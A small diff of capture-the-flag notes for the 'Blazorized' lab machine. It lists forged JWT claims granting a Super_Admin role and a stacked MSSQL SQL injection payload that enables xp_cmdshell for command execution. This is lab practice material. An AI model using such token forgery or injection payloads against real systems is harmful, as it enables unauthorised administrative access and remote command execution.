@@ -1,6 +1,7 @@
 # Blazorized
 
 JWT:
+
 {
   "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
   "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
@@ -8,6 +9,7 @@ JWT:
   "aud": "http://admin.blazorized.htb",
   "exp": 1740000000
 }
+
 
 Inject:
 www'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
